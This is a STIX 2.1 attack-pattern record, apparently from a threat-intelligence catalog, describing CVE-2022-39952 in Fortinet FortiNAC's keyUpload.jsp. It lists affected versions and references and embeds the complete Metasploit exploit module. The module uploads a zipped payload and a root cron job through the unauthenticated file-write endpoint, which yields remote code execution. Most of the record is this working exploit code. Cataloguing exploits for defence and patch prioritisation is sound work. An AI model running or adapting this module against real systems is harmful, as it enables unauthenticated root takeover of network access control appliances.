{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cd0e937-0150-4cf3-b3b6-d9d19f3d22c0",
    "created": "2024-08-14T17:02:52.128437Z",
    "modified": "2024-08-14T17:02:52.128441Z",
    "name": "Fortinet FortiNAC keyUpload.jsp arbitrary file write",
    "description": " This module uploads a payload to the /tmp directory in addition to a cron job to /etc/cron.d which executes the payload in the context of the root user.  The core vulnerability is an arbitrary file write issue in /configWizard/keyUpload.jsp which is accessible remotely and without authentication. When you send the vulnerable endpoint a ZIP file, it will extract an attacker controlled file to a directory of the attackers choice on the target system.  This issue is exploitable on the following versions of FortiNAC:  FortiNAC version 9.4 prior to 9.4.1 FortiNAC version 9.2 prior to 9.2.6 FortiNAC version 9.1 prior to 9.1.8 FortiNAC 8.8 all versions FortiNAC 8.7 all versions FortiNAC 8.6 all versions FortiNAC 8.5 all versions FortiNAC 8.3 all versions ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/fortinac_keyupload_file_write.rb",
            "external_id": "fortinac_keyupload_file_write.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/"
        },
        {
            "source_name": "reference",
            "url": "https://www.fortiguard.com/psirt/FG-IR-22-300"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2022-39952"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/9BvxYuiHYJ/cve-2022-39952"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-39952"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Fortinet FortiNAC keyUpload.jsp arbitrary file write',\n        'Description' => %q{\n          This module uploads a payload to the /tmp directory in addition to a cron job\n          to /etc/cron.d which executes the payload in the context of the root user.\n\n          The core vulnerability is an arbitrary file write issue in /configWizard/keyUpload.jsp which\n          is accessible remotely and without authentication. When you send the vulnerable\n          endpoint a ZIP file, it will extract an attacker controlled file to a directory\n          of the attackers choice on the target system.\n\n          This issue is exploitable on the following versions of FortiNAC:\n\n          FortiNAC version 9.4 prior to 9.4.1\n          FortiNAC version 9.2 prior to 9.2.6\n          FortiNAC version 9.1 prior to 9.1.8\n          FortiNAC 8.8 all versions\n          FortiNAC 8.7 all versions\n          FortiNAC 8.6 all versions\n          FortiNAC 8.5 all versions\n          FortiNAC 8.3 all versions\n        },\n        'Author' => [\n          'Gwendal Gu\u00e9gniaud', # discovery\n          'Zach Hanley',       # PoC\n          'jheysel-r7'         # module\n        ],\n        'References' => [\n          ['URL', 'https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/'],\n          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-22-300'],\n          ['URL', 'https://github.com/horizon3ai/CVE-2022-39952'],\n          ['URL', 'https://attackerkb.com/topics/9BvxYuiHYJ/cve-2022-39952'],\n          ['CVE', '2022-39952']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[linux unix],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 8443,\n          'WfsDelay' => '75'\n        },\n        'Arch' => [ ARCH_CMD, ARCH_X64, ARCH_X86 ],\n        'Targets' => [\n          [ 'CMD', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-02-16',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'configWizard', 'keyUpload.jsp'),\n      'method' => 'POST'\n    })\n\n    return Exploit::CheckCode::Unknown('Target did not respond') unless res\n    return Exploit::CheckCode::Safe(\"Target responded with unexpected HTTP response code: #{res.code}\") unless res.code == 200\n    return Exploit::CheckCode::Appears('Target indicated a successful upload occurred!') if res.body.include?('yams.jsp.portal.SuccessfulUpload')\n\n    Exploit::CheckCode::Safe('The target responded with a 200 OK message, however the response to our POST request with a blank body did not contain the expected upload successful message!')\n  end\n\n  def zip_file(filepath, contents)\n    zip = Rex::Zip::Archive.new\n    zip.add_file(filepath, contents)\n\n    zip.pack\n  end\n\n  def send_zip_file(filename, contents, file_description)\n    mime = Rex::MIME::Message.new\n    mime.add_part(contents, nil, 'binary', \"form-data; name=\\\"key\\\"; filename=\\\"#{filename}\\\"\")\n\n    print_status(\"Sending zipped #{file_description} to /configWizard/keyUpload.jsp\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'configWizard', 'keyUpload.jsp'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    })\n    fail_with(Failure::Unknown, 'Failed to send the ZIP file to /configWizard/keyUpload.jsp') unless res && res.code == 200 && res.body.include?('yams.jsp.portal.SuccessfulUpload')\n    print_good('Successfully sent ZIP file')\n  end\n\n  def cron_file(command)\n    cron_file = 'SHELL=/bin/sh'\n    cron_file << \"\\n\"\n    cron_file << 'PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin'\n    cron_file << \"\\n\"\n    cron_file << \"* * * * * root #{command}\"\n    cron_file << \"\\n\"\n\n    cron_file\n  end\n\n  def exploit\n    cron_filename = Rex::Text.rand_text_alpha(8)\n    cron_path = '/etc/cron.d/' + cron_filename\n\n    case target['Arch']\n    when ARCH_CMD\n      cron_command = payload.raw\n    when ARCH_X64, ARCH_X86\n      payload_filename = Rex::Text.rand_text_alpha(8)\n      payload_path = '/tmp/' + payload_filename\n      payload_data = payload.encoded_exe\n      cron_command = \"chmod +x #{payload_path} && #{payload_path}\"\n\n      # zip and send payload\n      zipped_payload = zip_file(payload_path, payload_data)\n      send_zip_file(payload_filename, zipped_payload, 'payload')\n      register_dirs_for_cleanup(payload_path)\n    else\n      fail_with(Failure::BadConfig, 'Invalid target architecture selected')\n    end\n\n    # zip and send cron job\n    zipped_cron = zip_file(cron_path, cron_file(cron_command))\n    send_zip_file(cron_filename, zipped_cron, 'cron job')\n    register_dirs_for_cleanup(cron_path)\n\n    print_status('Waiting for cron job to run')\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-16",
    "x_mitre_platforms": [
        "%w[linux unix]"
    ]
}